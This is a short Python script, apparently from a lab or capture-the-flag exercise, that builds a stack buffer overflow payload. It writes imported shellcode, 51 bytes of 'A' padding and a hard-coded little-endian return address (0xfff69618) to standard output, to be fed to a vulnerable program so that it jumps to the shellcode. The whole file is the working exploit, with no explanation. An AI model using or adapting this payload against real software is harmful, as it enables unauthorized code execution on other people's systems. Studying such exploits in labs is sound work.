from shellcode import shellcode
import sys

sys.stdout.buffer.write(shellcode + b'A'*51 + 0xfff69618.to_bytes(4, 'little'))